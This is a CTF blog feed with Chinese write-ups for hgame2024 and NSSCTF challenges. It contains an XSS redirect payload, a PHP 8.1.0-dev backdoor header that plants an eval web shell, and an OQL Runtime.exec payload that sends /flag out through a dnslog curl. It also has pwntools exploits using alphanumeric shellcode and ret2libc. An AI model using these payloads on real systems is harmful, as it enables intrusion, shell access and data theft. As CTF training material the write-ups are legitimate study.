language_">this</span>.<span class="property">tail</span> === <span class="variable language_">this</span>.<span class="property">size</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">tail</span> = <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tail</span> === <span class="variable language_">this</span>.<span class="property">front</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shift () &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">tail</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">fullFlag</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Can not shift a value from a empty queue!&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> ret = <span class="variable language_">this</span>[<span class="variable language_">this</span>.<span class="property">front</span>++];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">size</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">front</span> = <span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fullFlag</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    empty () &#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">this</span>.<span class="property">fullFlag</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">tail</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos 位置的棋子向右移动，返回移动后的棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state 棋盘状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos 位置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> getSolve = <span class="keyword">function</span> (<span class="params">state</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> que = [state], vst = &#123;[state]: <span class="number">1</span>&#125;, result = [];</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> cur = que.<span class="title function_">shift</span>(), res = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur[<span class="number">13</span>] === <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(; cur !== <span class="number">1</span>; cur = vst[cur])</span><br><span class="line">                result.<span class="title function_">push</span>(cur);</span><br><span class="line">            result.<span class="title function_">pop</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cur.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            (res = <span class="title function_">moveUp</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveDown</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveLeft</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveRight</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(getSolve(&#x27;35131111241222222002&#x27;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// =====自己写的部分======</span></span><br><span class="line"><span class="comment">// 获取步数</span></span><br><span class="line"><span class="keyword">let</span> step = <span class="keyword">function</span>(<span class="params">cur,result</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> steped = &#123;<span class="string">&quot;position&quot;</span>:<span class="number">0</span>,<span class="string">&quot;direction&quot;</span>:<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cur.<span class="property">length</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(cur[i] == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//console.log(i);</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveUp</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveRight</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveDown</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveLeft</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> steped;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归解决问题</span></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Solve</span> = <span class="keyword">function</span> (<span class="params">layout,gameId</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = <span class="title function_">getSolve</span>(layout);</span><br><span class="line"><span class="keyword">var</span> steps=[];</span><br><span class="line"><span class="keyword">while</span>(res.<span class="property">length</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> result = res.<span class="title function_">pop</span>();</span><br><span class="line">  steps.<span class="title function_">push</span>(<span class="title function_">step</span>(layout,result));</span><br><span class="line">  layout = result;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 解决完发送过去</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://106.14.57.14:30674/api/submit/&#x27;</span> +gameId, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">headers</span>: &#123;</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(steps)</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>();</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (data.<span class="property">status</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;next&quot;</span>:</span><br><span class="line"><span class="title class_">Solve</span>(data.<span class="property">game_stage</span>.<span class="property">layout</span>,gameId);<span class="comment">//如果是next就递归</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="attr">default</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 游戏开始</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://106.14.57.14:30674/api/newgame&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>();</span><br><span class="line">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="title class_">Solve</span>(data.<span class="property">layout</span>,data.<span class="property">gameId</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/m_2_1.png"></p><h2 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h2><p>把<code>这是一个word文件.docx</code>改成<code>这是一个word文件.zip</code>，解压后可以找到一个<code>media</code>文件夹。</p><p>接着是盲水印，工具链接：<a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a></p><p>盲水印解出来可以得到压缩包密码为<code>T1hi3sI4sKey</code>。</p><p>解压得到一个<code>secret.txt</code>，搜第一行可以得到一个类似的题。</p><p><img src="/./hgame2024_week2/m_3_1.png"></p><p>工具链接：<a href="http://www.spammimic.com/">spam mimic</a></p><p>解码后可以得到一串繁体字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</span><br></pre></td></tr></table></figure><p>接着是ROT8000，在线网站：<a href="https://www.dcode.fr/rot8000-cipher#f0">ROT8000密码</a></p><p>解码后即可得到flag。</p><p><img src="/./hgame2024_week2/m_3_2.png"></p><h2 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h2><p>audacity查看音频，调节一下采样率，可以看到key。</p><p><img src="/./hgame2024_week2/m_4_1.png"></p><p>上下翻转一下，得到正确的key为 <code>5H8w1nlWCX3hQLG</code> 。</p><p><img src="/./hgame2024_week2/m_4_2.png"></p><p><code>deepsound</code>解密音频，得到一个压缩包，压缩包里是一个gif图片。</p><p>观察gif，可以看到一闪而过的二维码，用 <a href="https://uutool.cn/gif2img/">在线网站</a> 提取出所有的帧数。</p><p>最后发现有4张图片有二维码的一部分，提取出来。</p><p><img src="/./hgame2024_week2/m_4_3.png"></p><p>把二维码拼好。</p><p><img src="/./hgame2024_week2/m_4_4.png"></p><p>用 <a href="https://merri.cx/qrazybox/">qrazybox</a> 解析二维码</p><p>之后修改<code>Format Info Pattern</code>，<code>Error Correction Level</code> 为 <code>L</code>， <code>Mask Pattern</code> 为<code>4</code>，即可得到flag。</p><p><img src="/./hgame2024_week2/m_4_5.png"></p><p><img src="/./hgame2024_week2/m_4_6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;drag0n_1s_d4nc1ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> PWN </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#18 Basic WP</title>
      <link href="/NSSCTF_Round18_Basic/"/>
      <url>/NSSCTF_Round18_Basic/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>查看源码，可以得到<code>king.php</code>和<code>nssctfroundSpring.php</code>。</p><p>查看<code>nssctfroundSpring.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>king.php</code>，点击评论区。</p><p><img src="/./NSSCTF_Round18_Basic/w_1_1.png"></p><p>通过这里，可以猜测到<code>nssctfroundSpring.php</code>里给的源码是关于评论发布的，经过一些测试，可以确定插入图片的url对应 <code>$matches[0]</code>，可以xss。</p><p>本地测试一下</p><p><img src="/./NSSCTF_Round18_Basic/w_1_2.png"></p><p>成功弹窗。</p><p>观察url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFYWxlcnQoJTJGeHNzJTJGKSUzQyUyRnNjcmlwdCUzRSUyMy5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure><p>把<code>content</code>部分base64解码一次再url解码一次，可以得到刚刚输入的图片评论。</p><p>构造一个访问 元梦之星 官网的xss。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx/&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com/&quot;&lt;/script&gt;#.png /png</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_3.png"></p><p>本地成功跳转到 元梦之星。</p><p>把这个链接给门酱就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFZG9jdW1lbnQubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFJTIzLnBuZyUyMCUyRnBuZw==</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_4.png"></p><h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>首页可以知道<code>PHP Version 8.1.0-dev</code></p><p>这个版本的php可以rce，参考链接：<a href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev 后门远程命令执行漏洞复现</a></p><p>用echo写马方便接下来操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># header</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1])?&gt;&#x27;&gt;/var/www/html/1.php&quot;);</span><br></pre></td></tr></table></figure><p>蚁剑链接</p><p><img src="/./NSSCTF_Round18_Basic/w_2_1.png"></p><p>接下来是提权，脚本要去github找非交互式的POC</p><p>参考链接：<a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">CVE-2021-3156-plus</a></p><p>把脚本下载下来，上传到服务器并make，即可执行命令</p><p><img src="/./NSSCTF_Round18_Basic/w_2_2.png"></p><p>读<code>/root/fl0g000</code>即可得到flag。</p><p><img src="/./NSSCTF_Round18_Basic/w_2_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF Round </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week1 WP</title>
      <link href="/hgame2024_week1/"/>
      <url>/hgame2024_week1/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>这道题是猜的，没有把js代码看明白</p><p>js代码搜<code>won</code>，可以看到这里</p><p><img src="/./hgame2024_week1/w_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br></pre></td></tr></table></figure><p>这个字符串的长度是65，且没有重复的字符，这里我猜一手是base64码表。</p><p>根据这个码表，从flag头找flag。</p><p>先是用<code>hgame</code>头来找，取出<code>hga</code>用变表的base64加密得到<code>hoD8</code>，然后全局搜，发现没有。</p><p>接着尝试<code>flag</code>头，用<code>fla</code>进行base64加密得到<code>I7R8</code>，全局搜得到以下结果</p><p><img src="/./hgame2024_week1/w_1_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure><p>把这串字符串用变表的base64解码，即可得到flag</p><p><img src="/./hgame2024_week1/w_1_3.png"></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>这道题注册一个账号登录成功即可。</p><p>进入题目来到<code>login.html</code>，先禁用js，点击注册，来到<code>register_page.php</code>页面。</p><p>之后打开js，随便注册一个账号。</p><p><img src="/./hgame2024_week1/w_2_1.png"></p><p>用刚刚注册的账号登录成功后，点击<code>[~Click here~]</code>即可得到flag。</p><p><img src="/./hgame2024_week1/w_2_2.png"></p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>参考这篇文章：<a href="https://chenxuuu.github.io/wooyun_articles/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html">OQL(对象查询语言)在产品实现中造成的RCE(Object Injection)</a></p><p>在<code>[Execute Object Query Language (OQL) query]</code>可以直接执行java代码，通过dnslog外带即可得到flag。</p><p><img src="/./hgame2024_week1/w_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(&quot;bashKKK-cKKK&#123;echo,Y3VybCBgY2F0IC9mbGFnYC5kZjE1YXUuZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.split(&quot;KKK&quot;))</span><br></pre></td></tr></table></figure><p>这里利用<code>split</code>将字符串变成字符数组，<code>echo</code>后边的base64编码里的内容是我们要执行的命令，这里我执行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl `cat /flag`.df15au.dnslog.cn</span><br></pre></td></tr></table></figure><p>之后在<code>dnslog</code>可以查看到flag。</p><p><img src="/./hgame2024_week1/w_3_2.png"></p><p>补上花括号即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;a90f6f3fde61e38f2c21b82de9c04e5702f1eaad&#125;</span><br></pre></td></tr></table></figure><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>考察的是http头，按照要求添加对应的http头即可。</p><p>这里需要注意的是，伪造本地并不是只有<code>X-Forwarded-For</code>，下面这些都可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure><p>这个题就用了<code>X-Real-IP</code>来伪造本地。</p><p><img src="/./hgame2024_week1/w_4_1.png"></p><p>最后在返回的头中得到一串<code>jwt</code>，用 <a href="https://jwt.io/">jwt.io</a> 解码即可得到flag。</p><p><img src="/./hgame2024_week1/w_4_2.png"></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>莫名奇妙就出了，很怪。</p><p>抓包，抓一个选课的包，然后去爆破重复发，等等就有flag了。</p><p><img src="/./hgame2024_week1/w_5_1.png"></p><p>爆破设置选择数值，爆破位置选择<code>User-Agent</code>的任意一个字符。</p><p><img src="/./hgame2024_week1/w_5_2.png"></p><p><code>id</code>从<code>1-5</code>都发一次，爆破结束后访问<code>/api/ok</code>就能得到flag了。</p><p><img src="/./hgame2024_week1/w_5_3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>nc即可得到flag。</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>先ida分析</p><p><img src="/./hgame2024_week1/p_2_1.png"></p><p>这里要求输入的数字要小于10，注意以下这里的<code>v4</code>是有符号的int。</p><p>查看<code>myread</code>函数</p><p><img src="/./hgame2024_week1/p_2_2.png"></p><p>注意以下形参的<code>a2</code>是无符号的int，也就是传进来的<code>v4</code>会转成无符号的<code>a1</code>，因此在这里<code>v4</code>传入一个负数绕过主函数的判断。</p><p>接着是对shellcode的检查要求是字母+数字，去网上抄一条就行了。</p><p>参考链接：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">[BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）</a></p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31592</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;input the length of your shellcode:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your shellcode:&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_2_3.png"></p><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>ida分析</p><p><img src="/./hgame2024_week1/p_3_1.png"></p><p><code>seed</code>取的是当前时间，之后是99次的随机数判断，然后就是<code>myread</code>函数。</p><p><img src="/./hgame2024_week1/p_3_2.png"></p><p><code>myread</code>函数存在栈溢出，没有后门，用libc打。</p><p>先走到<code>myread</code>，第一次溢出泄露出<code>puts</code>的地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">32019</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">myread = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(myread)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f2160359420</span></span><br></pre></td></tr></table></figure><p>泄露出<code>puts</code>的地址后3位为<code>420</code>。</p><p>通过 <a href="https://libc.blukat.me/">libc database search</a> 查找<code>puts</code>、  <code>system</code> 和 <code>/bin/sh</code> 的地址。</p><p><img src="/./hgame2024_week1/p_3_3.png"></p><p>根据<code>puts</code>的地址算出<code>libc</code>的基地址，在第二次栈溢出时<code>getshell</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span 